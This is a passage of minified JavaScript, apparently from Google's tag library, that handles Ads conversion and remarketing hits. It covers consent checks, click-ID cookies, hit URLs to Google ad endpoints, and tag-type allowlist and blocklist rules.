            a.h[K.g.zf] = v;
          }
        } else if (a.s.isGtmEvent) {
          on(a);
          a.metadata.user_data = h;
          return;
        }
        a.metadata.user_data = f;
      }
    },
    Dn = function (a) {
      pn(a, ["conversion", "remarketing"]) && (a.s.isGtmEvent ? "conversion" !== a.metadata.hit_type && a.eventName && (a.h[K.g.Mg] = a.eventName) : a.h[K.g.Mg] = a.eventName, k(a.s.h, function (b, c) {
        we[b.split(".")[0]] || (a.h[b] = c);
      }));
    },
    En = function (a) {
      if (a.eventName === K.g.la && (a.metadata.is_config_command = !0, pn(a, "conversion") && (a.metadata.speculative = !0), !pn(a, "remarketing") || !1 !== T(a.s, K.g.Fb) && !1 !== T(a.s, K.g.Ka) || (a.metadata.speculative = !0), pn(a, "landing_page"))) {
        var b = T(a.s, K.g.kb),
          c = T(a.s, K.g.za) || {},
          d = T(a.s, K.g.vb),
          e = a.metadata.conversion_linker_enabled,
          f = a.metadata.cookie_options;
        Sl({
          Th: e,
          lk: b,
          ei: c,
          Ai: d
        }, f);
        sl(a.target, a.s);
        bl({
          Lf: !1,
          Qe: a.metadata.redact_ads_data,
          yi: a.target.id,
          s: a.s,
          oc: e ? f : void 0,
          Je: e,
          Vh: a.h[K.g.tf],
          Rf: a.h[K.g.ob],
          Nf: a.h[K.g.lb]
        });
        a.isAborted = !0;
      }
    },
    Fn = function (a) {
      if (!xl(a, "hasPreAutoPiiCcdRule", !1) && pn(a, "conversion") && Q(K.g.F)) {
        var b = (T(a.s, K.g.Zd) || {})[a.h[K.g.Wa]],
          c = a.h[K.g.Hc],
          d;
        if (!(d = hf(b))) if (wf() && tm) {
          if (um) d = !0;else {
            var e = vl("AW-" + c);
            d = !!e && !!e.preAutoPii;
          }
        } else d = !1;
        if (d) {
          var f = Ja(),
            h = Qm();
          if (0 !== h.elements.length) {
            for (var l = [], m = 0; m < h.elements.length; ++m) {
              var n = h.elements[m];
              l.push(n.querySelector + "*" + Rm(n) + "*" + n.type);
            }
            a.h[K.g.qh] = l.join("~");
            var p = h.xl;
            p && (a.h[K.g.rh] = p.querySelector, a.h[K.g.ph] = Rm(p));
            a.h[K.g.oh] = String(Ja() - f);
            a.h[K.g.sh] = h.status;
          }
        }
      }
    },
    Gn = function (a) {
      if (a.eventName === K.g.Ha && !a.s.isGtmEvent) {
        if (!a.metadata.consent_updated && pn(a, "conversion")) {
          var b = T(a.s, K.g.nb);
          if ("function" !== typeof b) return;
          var c = String(T(a.s, K.g.Xa)),
            d = a.h[c],
            e = T(a.s, c);
          c === K.g.ib || c === K.g.bc ? Tl({
            Di: c,
            callback: b,
            gi: e
          }, a.metadata.cookie_options, a.metadata.redact_ads_data, Ll) : b(d || e);
        }
        a.isAborted = !0;
      }
    },
    Hn = function (a) {
      if (pn(a, "conversion") && Q(K.g.F) && (a.h[K.g.kc] || a.h[K.g.ic])) {
        var b = a.h[K.g.Wa],
          c = H(a.metadata.cookie_options),
          d = Ik(c.prefix);
        c.prefix = "_gcl" === d ? "" : d;
        if (a.h[K.g.kc]) {
          var e = kn(b, c);
          e && (a.h[K.g.vh] = e);
        }
        if (a.h[K.g.ic]) {
          var f = fn(b, c).yk;
          f && (a.h[K.g.Wg] = f);
        }
      }
    },
    In = function (a) {
      var b = P(4),
        c = a.s,
        d,
        e,
        f;
      if (!b) {
        var h = $g(c, K.g.W);
        d = Sa(ic(h) ? h : {});
      }
      var l = $g(c, K.g.W, 1),
        m = $g(c, K.g.W, 2);
      e = Sa(ic(l) ? l : {}, ".");
      f = Sa(ic(m) ? m : {}, ".");
      b || (a.h[K.g.tf] = d);
      a.h[K.g.ob] = e;
      a.h[K.g.lb] = f;
    },
    Jn = function (a) {
      if (pn(a, ["conversion", "remarketing"])) {
        var b = "conversion" === a.metadata.hit_type;
        b && a.eventName !== K.g.ka || (a.copyToHitData(K.g.T), b && (a.copyToHitData(K.g.Vd), a.copyToHitData(K.g.Td), a.copyToHitData(K.g.Ud), a.copyToHitData(K.g.Sd), a.h[K.g.Gg] = a.eventName));
      }
    },
    Kn = function (a) {
      if (pn(a, ["conversion", "remarketing"])) {
        var b = a.s,
          c = T(b, K.g.Jb);
        if (!0 === c || !1 === c) a.h[K.g.Jb] = c;
        var d = T(b, K.g.Z);
        if (!0 === d || !1 === d) a.h[K.g.jd] = !d;
        !1 === d && pn(a, "remarketing") && (a.isAborted = !0);
      }
    },
    Ln = function (a) {
      pn(a, "conversion") && (a.copyToHitData(K.g.Pc), a.copyToHitData(K.g.Wd), a.copyToHitData(K.g.Vc), a.copyToHitData(K.g.ae), a.copyToHitData(K.g.hc), a.copyToHitData(K.g.Mc));
    },
    Mn = function (a) {
      Al(a);
    },
    Nn = function (a) {
      if (pn(a, ["conversion", "remarketing"]) && z.__gsaExp && z.__gsaExp.id) {
        var b = z.__gsaExp.id;
        if (ta(b)) try {
          var c = Number(b());
          isNaN(c) || (a.h[K.g.ah] = c);
        } catch (d) {}
      }
    },
    On = function (a) {
      if (pn(a, ["conversion", "remarketing"])) {
        var b = ln();
        void 0 !== b && (a.h[K.g.uh] = b || "error");
        var c = gi();
        c && (a.h[K.g.he] = c);
        var d = fi();
        d && (a.h[K.g.pe] = d);
      }
    },
    Pn = function (a) {
      pn(a, ["conversion"]) && "1" === Qj(!1)._up && (a.h[K.g.ke] = !0);
    },
    Qn = function (a) {
      if (pn(a, ["conversion"])) {
        var b = P(85) ? Q(K.g.K) : !0;
        a.metadata.redact_click_ids = !b || !!a.metadata.redact_ads_data && !Q(K.g.F);
      }
    },
    Rn = function (a) {
      if (pn(a, ["conversion", "user_data_lead", "user_data_web"]) && Q(K.g.F) && a.metadata.conversion_linker_enabled) {
        var b = a.metadata.cookie_options,
          c = Ik(b.prefix);
        "_gcl" === c && (c = "");
        if (!P(85) || Q(K.g.K)) {
          var d = c;
          if ($m.test(D.location.host) ? cn.test(D.location.href) || an.test(D.location.href) : !Yk(d)) {
            var e = hn(c);
            e && (a.h[K.g.ib] = e);
            if (!c) {
              var f = en(Bk() ? xk() : {}, an);
              f && (a.h[K.g.fe] = f);
            }
          } else {
            var h = jn(c);
            h && (a.h[K.g.kc] = h);
            if (!c) {
              var l = a.h[K.g.Wa];
              b = H(b);
              b.prefix = c;
              var m = fn(l, b, !0).xk;
              m && (a.h[K.g.ic] = m);
            }
          }
        }
      }
    },
    Sn = function (a) {
      if (pn(a, ["conversion", "remarketing", "user_data_lead", "user_data_web"]) && a.metadata.conversion_linker_enabled && Q(K.g.F)) {
        var b = !P(3);
        if ("remarketing" !== a.metadata.hit_type || b) {
          var c = a.metadata.cookie_options;
          hk(c, "conversion" === a.metadata.hit_type && a.eventName !== K.g.Ha);
          if (!P(85) || Q(K.g.K)) a.h[K.g.bc] = bk[dk(c.prefix)];
        }
      }
    },
    Tn = function (a) {
      if (pn(a, ["conversion"])) {
        var b = Cl(a.metadata.cookie_options);
        if (b && !a.h[K.g.qa]) {
          var c = Pi(a.h[K.g.Wa]);
          a.h[K.g.qa] = c;
        }
        b && (a.h[K.g.ub] = b, a.metadata.send_ccm_parallel_ping = !0);
      }
    },
    Un = function (a) {
      var b = !Q(K.g.F),
        c = P(85) && !Q(K.g.K);
      switch (a.metadata.hit_type) {
        case "user_data_lead":
        case "user_data_web":
          a.isAborted = !!(b || a.metadata.consent_updated || c);
          break;
        case "remarketing":
          a.isAborted = b || c;
          break;
        case "conversion":
          a.metadata.consent_updated && (a.h[K.g.Od] = !0);
      }
    },
    Vn = function (a) {
      pn(a, ["conversion"]) && a.s.eventMetadata.is_external_event && (a.h[K.g.Ch] = !0);
    },
    Wn = function (a) {
      var b;
      if ("gtag.config" !== a.eventName && a.metadata.send_user_data_hit) switch (a.metadata.hit_type) {
        case "user_data_web":
          b = 97;
          on(a);
          break;
        case "user_data_lead":
          b = 98;
          on(a);
          break;
        case "conversion":
          b = 99;
      }
      !a.metadata.speculative && b && J(b);
      !0 === a.metadata.speculative && (a.isAborted = !0);
    },
    wn = !1,
    xn = !1;
  var Xn = {
    D: {
      sg: "ads_conversion_hit",
      Ze: "container_execute_start",
      vg: "container_setup_end",
      af: "container_setup_start",
      ug: "container_execute_end",
      wg: "container_yield_end",
      bf: "container_yield_start",
      xh: "event_execute_end",
      wh: "event_evaluation_end",
      Af: "event_evaluation_start",
      yh: "event_setup_end",
      fd: "event_setup_start",
      zh: "ga4_conversion_hit",
      kd: "page_load",
      jm: "pageview",
      wb: "snippet_load",
      Jh: "tag_callback_error",
      Kh: "tag_callback_failure",
      Lh: "tag_callback_success",
      Mh: "tag_execute_end",
      nc: "tag_execute_start"
    }
  };
  function Yn() {
    function a(c, d) {
      var e = cb(d);
      e && b.push(c + "=" + e);
    }
    var b = [];
    a("&u", "GTM");
    a("&ut", "TAGGING");
    a("&h", "HEALTH");
    return b.join("");
  }
  ;
  var Zn = !1,
    $n = "L S Y E EC TC HTC".split(" "),
    ao = ["S", "V", "E"],
    bo = ["TS", "TI", "TE"];
  var Fo = function (a) {},
    Go = function (a) {},
    Ho = function () {},
    Io = function (a, b) {},
    Jo = function (a, b) {},
    Ko = function (a, b) {},
    Lo = function (a, b) {},
    co = function (a, b, c, d, e, f) {
      var h;
      h = void 0 === h ? !1 : h;
      var l = {};
      return l;
    },
    eo = function (a) {
      var b = !1;
      return b;
    },
    fo = function (a, b) {},
    Mo = function () {
      var a = {};
      return a;
    },
    yo = function (a) {
      a = void 0 === a ? !0 : a;
      var b = {};
      return b;
    },
    No = function () {},
    Oo = function (a, b) {},
    Po = function (a, b, c) {};
  var Qo = function (a, b) {
    var c,
      d = z.GooglebQhCsO;
    d || (d = {}, z.GooglebQhCsO = d);
    c = d;
    if (c[a]) return !1;
    c[a] = [];
    c[a][0] = b;
    return !0;
  };
  var Ro = function (a, b, c) {
    var d = Dh(a, "fmt");
    if (b) {
      var e = Dh(a, "random"),
        f = Dh(a, "label") || "";
      if (!e) return !1;
      var h = bj(decodeURIComponent(f.replace(/\+/g, " ")) + ":" + decodeURIComponent(e.replace(/\+/g, " ")));
      if (!Qo(h, b)) return !1;
    }
    d && 4 != d && (a = Fh(a, "rfmt", d));
    var l = Fh(a, "fmt", 4);
    Qb(l, function () {
      z.google_noFurtherRedirects && b && b.call && (z.google_noFurtherRedirects = null, b());
    }, void 0, c, D.getElementsByTagName("script")[0].parentElement || void 0);
    return !0;
  };
  var So = function (a) {
      for (var b = {}, c = 0; c < a.length; c++) {
        var d = a[c],
          e = void 0;
        if (d.hasOwnProperty("google_business_vertical")) {
          e = d.google_business_vertical;
          var f = {};
          b[e] = b[e] || (f.google_business_vertical = e, f);
        } else e = "", b.hasOwnProperty(e) || (b[e] = {});
        var h = b[e],
          l;
        for (l in d) "google_business_vertical" !== l && (l in h || (h[l] = []), h[l].push(d[l]));
      }
      return Object.keys(b).map(function (m) {
        return b[m];
      });
    },
    To = function (a) {
      if (!a || !a.length) return [];
      for (var b = [], c = 0; c < a.length; ++c) {
        var d = a[c];
        if (d) {
          var e = {};
          b.push((e.id = d.id, e.origin = d.origin, e.destination = d.destination, e.start_date = d.start_date, e.end_date = d.end_date, e.location_id = d.location_id, e.google_business_vertical = d.google_business_vertical, e));
        }
      }
      return b;
    },
    Uo = function (a) {
      if (!a || !a.length) return [];
      for (var b = [], c = 0; c < a.length; ++c) {
        var d = a[c];
        d && b.push({
          item_id: d.id,
          quantity: d.quantity,
          value: d.price,
          start_date: d.start_date,
          end_date: d.end_date
        });
      }
      return b;
    },
    Wo = function (a) {
      if (!a) return "";
      for (var b = [], c = 0; c < a.length; c++) {
        var d = a[c],
          e = [];
        d && (e.push(Vo(d.value)), e.push(Vo(d.quantity)), e.push(Vo(d.item_id)), e.push(Vo(d.start_date)), e.push(Vo(d.end_date)), b.push("(" + e.join("*") + ")"));
      }
      return 0 < b.length ? b.join("") : "";
    },
    Vo = function (a) {
      return "number" !== typeof a && "string" !== typeof a ? "" : a.toString();
    },
    Yo = function (a, b) {
      var c = Xo(b);
      return "" + a + (a && c ? ";" : "") + c;
    },
    Xo = function (a) {
      if (!a || "object" !== typeof a || "function" === typeof a.join) return "";
      var b = [];
      k(a, function (c, d) {
        var e, f;
        if (va(d)) {
          for (var h = [], l = 0; l < d.length; ++l) {
            var m = Zo(d[l]);
            void 0 != m && h.push(m);
          }
          f = 0 !== h.length ? h.join(",") : void 0;
        } else f = Zo(d);
        e = f;
        var n = Zo(c);
        n && void 0 != e && b.push(n + "=" + e);
      });
      return b.join(";");
    },
    Zo = function (a) {
      var b = typeof a;
      if (null != a && "object" !== b && "function" !== b) return String(a).replace(/,/g, "\\,").replace(/;/g, "\\;").replace(/=/g, "\\=");
    },
    $o = function (a, b) {
      var c = [],
        d = function (f, h) {
          null != h && "" !== h && (!0 === h && (h = 1), !1 === h && (h = 0), c.push(f + "=" + encodeURIComponent(h)));
        },
        e = a.metadata.hit_type;
      "conversion" !== e && "remarketing" !== e || d("random", a.metadata.event_start_timestamp_ms);
      k(b, d);
      return c.join("&");
    },
    ap = function (a, b) {
      var c = a.metadata.hit_type,
        d = a.h[K.g.Hc],
        e = Q(K.g.F),
        f = [],
        h,
        l = a.s.onSuccess,
        m,
        n = Vi() ? 2 : 3,
        p = 0,
        q = function (x) {
          f.push(x);
          x.Ra && p++;
        };
      switch (c) {
        case "conversion":
          m = "pagead/conversion";
          var r = "";
          e ? a.metadata.is_gcp_conversion ? (h = "https://www.google.com/", m = "pagead/1p-conversion") : h = "https://www.googleadservices.com/" : h = "https://pagead2.googlesyndication.com/";
          a.metadata.is_gcp_conversion && (r = "&gcp=1&sscte=1&ct_cookie_present=1");
          var t = {
            ab: "" + h + m + "/" + d + "/?" + $o(a, b) + r,
            format: n,
            Ra: !0
          };
          if (!P(85) || Q(K.g.K)) t.attributes = {
            attributionsrc: ""
          };
          q(t);
          a.metadata.send_ccm_parallel_ping && q({
            ab: "" + h + "ccm/conversion/" + d + "/?" + $o(a, b) + r,
            format: 2,
            Ra: !0
          });
          a.metadata.is_gcp_conversion && (r = "&gcp=1&ct_cookie_present=1", q({
            ab: "" + (e ? "https://googleads.g.doubleclick.net/" : h) + "pagead/viewthroughconversion/" + d + "/?" + $o(a, b) + r,
            format: n,
            Ra: !0
          }));
          break;
        case "remarketing":
          var u = b.data || "",
            v = So(To(a.h[K.g.T]));
          if (v.length) {
            for (var w = 0; w < v.length; w++) b.data = Yo(u, v[w]), q({
              ab: "https://googleads.g.doubleclick.net/pagead/viewthroughconversion/" + d + "/?" + $o(a, b),
              format: n,
              Ra: !0
            }), a.metadata.send_fledge_experiment && q({
              ab: Xm() + "/td/rul/" + d + "?" + $o(a, b),
              format: 4,
              Ra: !1
            }), a.metadata.event_start_timestamp_ms += 1;
            a.metadata.send_fledge_experiment = !1;
          } else q({
            ab: "https://googleads.g.doubleclick.net/pagead/viewthroughconversion/" + d + "/?" + $o(a, b),
            format: n,
            Ra: !0
          });
          break;
        case "user_data_lead":
          q({
            ab: "https://google.com/pagead/form-data/" + d + "?" + $o(a, b),
            format: 1,
            Ra: !0
          });
          break;
        case "user_data_web":
          q({
            ab: "https://google.com/ccm/form-data/" + d + "?" + $o(a, b),
            format: 1,
            Ra: !0
          });
      }
      1 < f.length && ta(a.s.onSuccess) && (l = Ta(a.s.onSuccess, p));
      Vi() || "conversion" !== c && "remarketing" !== c || !a.metadata.send_fledge_experiment || q({
        ab: Xm() + "/td/rul/" + d + "?" + $o(a, b),
        format: 4,
        Ra: !1
      });
      return {
        onSuccess: l,
        Ok: f
      };
    },
    bp = function (a, b, c, d, e, f) {
      Go(c);
      var h = function () {
        e && e();
      };
      switch (b) {
        case 1:
          $b(a);
          e && e();
          break;
        case 2:
          Tb(a, h, void 0, f);
          break;
        case 3:
          var l = !1;
          try {
            l = Ro(a, h, f);
          } catch (p) {
            l = !1;
          }
          l || bp(a, 2, c, d, h, f);
          break;
        case 4:
          var m = "AW-" + c.h[K.g.Hc],
            n = c.h[K.g.Wa];
          n && (m = m + "/" + n);
          Wm(a, m);
      }
    },
    cp = {},
    dp = (cp[K.g.Od] = "gcu", cp[K.g.ib] = "gclaw", cp[K.g.bc] = "auid", cp[K.g.Sd] = "dscnt", cp[K.g.Td] = "fcntr", cp[K.g.Ud] = "flng", cp[K.g.Vd] = "mid", cp[K.g.Gg] = "bttype", cp[K.g.Wa] = "label", cp[K.g.Gb] = "capi", cp[K.g.na] = "currency_code", cp[K.g.Wd] = "vdltv", cp[K.g.oj] = "_dbg", cp[K.g.ae] = "oedeld", cp[K.g.lb] = "edid", cp[K.g.Ng] = "fledge", cp[K.g.fe] = "gac", cp[K.g.ic] = "gacgb", cp[K.g.Wg] = "gacmcov", cp[K.g.he] = "gdpr", cp[K.g.ob] = "gdid", cp[K.g.ah] = "gsaexp", cp[K.g.bh] = "frm", cp[K.g.ke] = "gtm_up", cp[K.g.tf] = "did", cp[K.g.Pc] = void 0, cp[K.g.sb] = "tiba", cp[K.g.Jb] = "rdp", cp[K.g.ub] = "ecsid", cp[K.g.Vc] = "delopc", cp[K.g.pe] = "gdpr_consent", cp[K.g.qa] = "oid", cp[K.g.oh] = "ec_lat", cp[K.g.ph] = "ec_meta", cp[K.g.qh] = "ec_m", cp[K.g.rh] = "ec_sel", cp[K.g.sh] = "ec_s", cp[K.g.zf] = "ec_mode", cp[K.g.wa] = "userId", cp[K.g.uh] = "us_privacy", cp[K.g.aa] = "value", cp[K.g.kc] = "gclgb", cp[K.g.vh] = "mcov", cp[K.g.Bh] = "hn", cp[K.g.Ch] = "gtm_ee", cp[K.g.jd] = "npa", cp[K.g.Hc] = null, cp[K.g.tb] = null, cp[K.g.Da] = null, cp[K.g.T] = null, cp[K.g.oa] = null, cp[K.g.Aa] = null, cp[K.g.xf] = null, cp),
    fp = function (a) {
      ep(a, function (b) {
        for (var c = ap(a, b), d = c.onSuccess, e = c.Ok, f = 0; f < e.length; f++) {
          var h = e[f];
          bp(h.ab, h.format, a, b, h.Ra ? d : void 0, h.attributes);
        }
      });
    },
    ep = function (a, b) {
      var c = a.metadata.hit_type,
        d = {},
        e = {},
        f = [],
        h = a.metadata.event_start_timestamp_ms;
      if ("conversion" === c || "remarketing" === c) d.cv = "11", d.fst = h, d.fmt = 3, d.bg = "ffffff", d.guid = "ON", d.async = "1";
      d.gtm = Xi();
      Of() && (P(48) || "remarketing" !== c) && (d.gcs = oi(), P(50) || "remarketing" !== c && Pf()) && (d.gcd = si(a.s));
      P(52) && (wi() && (d.dma_cps = ti()), d.dma = vi());
      if (a.h[K.g.tb]) {
        var l = a.h[K.g.tb].split("x");
        2 === l.length && (d.u_w = l[0], d.u_h = l[1]);
      }
      if (a.h[K.g.Da]) {
        var m = a.h[K.g.Da];
        2 === m.length ? d.hl = m : 5 === m.length && (d.hl = m.substring(0, 2), d.gl = m.substring(3, 5));
      }
      var n = a.metadata.redact_click_ids,
        p = function (w, x) {
          var y = a.h[x];
          y && (d[w] = n ? vj(y) : y);
        };
      p("url", K.g.oa);
      p("ref", K.g.Aa);
      p("top", K.g.xf);
      P(8) && (dp[K.g.Wc] = "uaa", dp[K.g.Xc] = "uab", dp[K.g.Yc] = "uafvl", dp[K.g.Zc] = "uamb", dp[K.g.ad] = "uam", dp[K.g.bd] = "uap", dp[K.g.dd] = "uapv", dp[K.g.ed] = "uaw");
      k(a.h, function (w, x) {
        if (dp.hasOwnProperty(w)) {
          var y = dp[w];
          y && (d[y] = x);
        } else e[w] = x;
      });
      var q = a.h[K.g.Pc];
      void 0 != q && "" !== q && (d.vdnc = String(q));
      var r = a.h[K.g.Mc];
      void 0 !== r && (d.shf = r);
      var t = a.h[K.g.hc];
      void 0 !== t && (d.delc = t);
      d.data = Xo(e);
      var u = a.h[K.g.T];
      u && "conversion" === c && (d.iedeld = kf(u), d.item = Wo(Uo(u)));
      if (!("conversion" !== c && "user_data_lead" !== c && "user_data_web" !== c || !a.metadata.user_data || P(85) && !Q(K.g.K) || P(29) && !Q(K.g.F))) {
        var v = he(a.metadata.user_data);
        v && f.push(v.then(function (w) {
          d.em = w.hi;
          if ("user_data_web" === c && 0 < w.vl) {
            var x = Dl(a.metadata.cookie_options);
            d.ecsid = x;
          }
        }));
      }
      if (f.length) try {
        Promise.all(f).then(function () {
          b(d);
        });
        return;
      } catch (w) {}
      b(d);
    };
  var gp = function () {
      this.h = {};
    },
    hp = function (a, b, c) {
      null != c && (a.h[b] = c);
    },
    ip = function (a) {
      return Object.keys(a.h).map(function (b) {
        return encodeURIComponent(b) + "=" + encodeURIComponent(a.h[b]);
      }).join("&");
    },
    kp = function (a, b, c, d) {
      if (!Of()) {
        jp(a, b, c, d);
        return;
      }
      bg(function () {
        Q(K.g.F) ? jp(a, b, c, d) : d && d();
      }, [K.g.F]);
    };
  var lp = function (a, b, c) {
      c = void 0 === c ? !0 : c;
      var d = {
          gclgb: function () {
            return Hl("gb", b, c).join(".");
          },
          gacgb: function () {
            return Ol(c);
          },
          gclaw: function () {
            return Ll(b, c).join(".");
          },
          gac: function () {
            return Nl(c);
          }
        },
        e = Ql(b),
        f = e ? "gclgb" : "gclaw",
        h = e ? "gacgb" : "gac",
        l = d[h],
        m = (0, d[f])(),
        n = "_gcl" !== b ? "" : l();
      m && hp(a, f, m);
      n && hp(a, h, n);
    },
    jp = function (a, b, c, d) {
      c = c || {};
      var e = c.oc || {},
        f = new gp();
      ge(b, function (h, l) {
        hp(f, "em", h);
        hp(f, "gtm", Xi());
        Of() && (hp(f, "gcs", oi()), hp(f, "gcd", si()));
        P(52) && (wi() && hp(f, "dma_cps", ti()), hp(f, "dma", vi()));
        lp(f, Ik(e.prefix), c.Qe);
        hp(f, "auid", bk[dk(e.prefix)]);
        if (0 < l) {
          var m = Dl(e);
          hp(f, "ecsid", m);
        }
        var n = ip(f);
        $b("https://google.com/pagead/form-data/" + a + "?" + n);
        $b("https://google.com/ccm/form-data/" + a + "?" + n);
        d && d();
      });
    };
  function mp(a, b) {
    if (data.entities && data.entities[a]) return data.entities[a][b];
  }
  ;
  var op = function (a) {
      var b = qg();
      np(b).event && np(b).event.push(a);
    },
    pp = function () {
      var a = np(qg());
      return a.event ? a.event : [];
    };
  function np(a) {
    var b,
      c = Ae.r;
    c || (c = {
      container: {}
    }, Ae.r = c);
    b = c;
    var d = b.container[a];
    d || (d = {
      entity: [],
      event: []
    }, b.container[a] = d);
    return d;
  }
  ;
  var qp = new RegExp(/^(.*\.)?(google|youtube|blogger|withgoogle)(\.com?)?(\.[a-z]{2})?\.?$/),
    rp = {
      cl: ["ecl"],
      customPixels: ["nonGooglePixels"],
      ecl: ["cl"],
      ehl: ["hl"],
      hl: ["ehl"],
      html: ["customScripts", "customPixels", "nonGooglePixels", "nonGoogleScripts", "nonGoogleIframes"],
      customScripts: ["html", "customPixels", "nonGooglePixels", "nonGoogleScripts", "nonGoogleIframes"],
      nonGooglePixels: [],
      nonGoogleScripts: ["nonGooglePixels"],
      nonGoogleIframes: ["nonGooglePixels"]
    },
    sp = {
      cl: ["ecl"],
      customPixels: ["customScripts", "html"],
      ecl: ["cl"],
      ehl: ["hl"],
      hl: ["ehl"],
      html: ["customScripts"],
      customScripts: ["html"],
      nonGooglePixels: ["customPixels", "customScripts", "html", "nonGoogleScripts", "nonGoogleIframes"],
      nonGoogleScripts: ["customScripts", "html"],
      nonGoogleIframes: ["customScripts", "html", "nonGoogleScripts"]
    },
    tp = "google customPixels customScripts html nonGooglePixels nonGoogleScripts nonGoogleIframes".split(" "),
    wp = function (a) {
      var b = $e("gtm.allowlist") || $e("gtm.whitelist");
      b && J(9);
      Ge && (b = ["google", "gtagfl", "lcl", "zone"]);
      up() && (Ge ? J(116) : J(117), vp && (b = [], window.console && window.console.log && window.console.log("GTM blocked. See go/13687728.")));
      var c = b && Pa(Fa(b), rp),
        d = $e("gtm.blocklist") || $e("gtm.blacklist");
      d || (d = $e("tagTypeBlacklist")) && J(3);
      d ? J(8) : d = [];
      up() && (d = Fa(d), d.push("nonGooglePixels", "nonGoogleScripts", "sandboxedScripts"));
      0 <= Fa(d).indexOf("google") && J(2);
      var e = d && Pa(Fa(d), sp),
        f = {};
      return function (h) {
        var l = h && h[nc.ia];
        if (!l || "string" != typeof l) return !0;
        l = l.replace(/^_*/, "");
        if (void 0 !== f[l]) return f[l];
        var m = Se[l] || [],
          n = a(l, m),
          p;
        p = np(qg()).entity;
        for (var q = 0; q < p.length; q++) try {
          n = n && p[q](l, m);
        } catch (y) {
          n = !1;
        }
        if (b) {
          var r;
          if (r = n) a: {
            if (0 > c.indexOf(l)) if (m && 0 < m.length) for (var t = 0; t < m.length; t++) {
              if (0 > c.indexOf(m[t])) {
                J(11);
                r = !1;
                break a;
              }
            } else {
              r = !1;
              break a;
            }
            r = !0;
          }
          n = r;
        }
        var u = !1;
        if (d) {
          var v = 0 <= e.indexOf(l);
          if (v) u = v;else {
            var w = Ba(e, m || []);
            w && J(10);
            u = w;
          }
        }
        var x = !n || u;
        x || !(0 <= m.indexOf("sandboxedScripts")) || c && -1 !== c.indexOf("sandboxedScripts") || (x = Ba(e, tp));
        return f[l] = x;
      };
    },
    vp = !1;
  var up = function () {
      return qp.test(z.location && z.location.hostname);
    },
    xp = function () {
      ig && np(qg()).entity.push(function (a) {
        var b = {};
        b[nc.ia] = "__" + a;
        for (var c in void 0) (void 0).hasOwnProperty(c) && (b["vtp_" + c] = (void 0)[c]);
        var d;
        if (fd(b)) {
          var e = b[nc.ia];
          if (!e) throw "Error: No function name given for function call.";
          var f = Tc[e];
          d = !!f && !!f.runInSiloedMode;
        } else d = !!mp(b[nc.ia], 4);
        return d;
      });
    };
  function yp(a, b) {
    if (a) {
      var c = "" + a;
      0 !== c.indexOf("http://") && 0 !== c.indexOf("https://") && (c = "https://" + c);
      "/" === c[c.length - 1] && (c = c.substring(0, c.length - 1));
      return uj("" + c + b).href;
    }
  }
  function zp() {
    return !!ze.xe && "SGTM_TOKEN" !== ze.xe.split("@@").join("");
  }
  function Ap(a) {
    for (var b = ha([K.g.Tc, K.g.Lb]), c = b.next(); !c.done; c = b.next()) {
      var d = T(a, c.value);
      if (d) return d;
    }
  }
  ;
  var Cp = function (a, b, c, d) {
      if (!Bp() && !wg(a)) {
        var e = "?id=" + encodeURIComponent(a) + "&l=" + ze.da,
          f = 0 === a.indexOf("GTM-");
        f || (e += "&cx=c");
        P(69) && (e += "&gtm=" + Xi());
        var h = zp();
        h && (e += "&sign=" + ze.xe);
        var l = c ? "/gtag/js" : "/gtm.js",
          m = Ie || Ke ? yp(b, l + e) : void 0;
        if (!m) {
          var n = ze.Pd + l;
          h && Kb && f && (n = Kb.replace(/^(?:https?:\/\/)?/i, "").split(/[?#]/)[0]);
          m = hl("https://", "http://", n + e);
        }
        var p = a;
        d.siloed && (yg({
          ctid: p,
          isDestination: !1
        }), p = kg(p));
        var q = p,
          r = xg();
        eg().container[q] = {
          state: 1,
          context: d,
          parent: r
        };
        fg({
          ctid: q,
          isDestination: !1
        });
        Qb(m);
      }
    },
    Dp = function (a, b, c) {
      var d;
      if (d = !Bp()) {
        var e = eg().destination[a];
        d = !(e && e.state);
      }
      if (d) if (zg()) eg().destination[a] = {
        state: 0,
        transportUrl: b,
        context: c,
        parent: xg()
      }, fg({
        ctid: a,
        isDestination: !0
      }), J(91);else {
        var f = "/gtag/destination?id=" + encodeURIComponent(a) + "&l=" + ze.da + "&cx=c";
        P(69) && (f += "&gtm=" + Xi());
        zp() && (f += "&sign=" + ze.xe);
        var h = Ie || Ke ? yp(b, f) : void 0;
        h || (h = hl("https://", "http://", ze.Pd + f));
        var l = a;
        c.siloed && (yg({
          ctid: l,
          isDestination: !0
        }), l = kg(l));
        eg().destination[l] = {
          state: 1,
          context: c,
          parent: xg()
        };
        fg({
          ctid: l,
          isDestination: !0
        });
        Qb(h);
      }
    };
  function Bp() {
    if (Vi()) {
      return !0;
    }
    return !1;
  }
  ;
  var Ep = "",
    Fp = [];
  function Gp(a) {
    var b = "";
    Ep && (b = "&dl=" + encodeURIComponent(Ep));
    0 < Fp.length && (b += "&tdp=" + Fp.join("."));
    a.Cb && (Ep = "", Fp.length = 0, b && a.ui());
    return b;
  }
  ;
  var Hp = [];
  function Ip(a) {
    if (!Hp.length) return "";
    var b = "&tdc=" + Hp.join("!");
    a.Cb && (a.ui(), Hp.length = 0);
    return b;
  }
  ;
  var Jp = {
      initialized: 11,
      complete: 12,
      interactive: 13
    },
    Kp = {},
    Lp = Object.freeze((Kp[K.g.Ka] = !0, Kp)),
    Mp = 0 <= D.location.search.indexOf("?gtm_diagnostics=") || 0 <= D.location.search.indexOf("&gtm_diagnostics="),
    Op = function (a, b, c) {
      if (Jg && "config" === a && !(1 < el(b).J.length)) {
        var d,
          e = Lb("google_tag_data", {});
        e.td || (e.td = {});
        d = e.td;
        var f = H(c.H);
        H(c.h, f);
        var h = [],
          l;
        for (l in d) {
          var m = Np(d[l], f);
          m.length && (Mp && console.log(m), h.push(l));
        }
        h.length && (h.length && Jg && Hp.push(b + "*" + h.join(".")), ab("TAGGING", Jp[D.readyState] || 14));
        d[b] = f;
      }
    };
  function Pp(a, b) {
    var c = {},
      d;
    for (d in b) b.hasOwnProperty(d) && (c[d] = !0);
    for (var e in a) a.hasOwnProperty(e) && (c[e] = !0);
    return c;
  }
  function Np(a, b, c, d) {
    c = void 0 === c ? {} : c;
    d = void 0 === d ? "" : d;
    if (a === b) return [];
    var e = function (q, r) {
        var t = r[q];
        return void 0 === t ? Lp[q] : t;
      },
      f;
    for (f in Pp(a, b)) {
      var h = (d ? d + "." : "") + f,
        l = e(f, a),
        m = e(f, b),
        n = "object" === fc(l) || "array" === fc(l),
        p = "object" === fc(m) || "array" === fc(m);
      if (n && p) Np(l, m, c, h);else if (n || p || l !== m) c[h] = !0;
    }
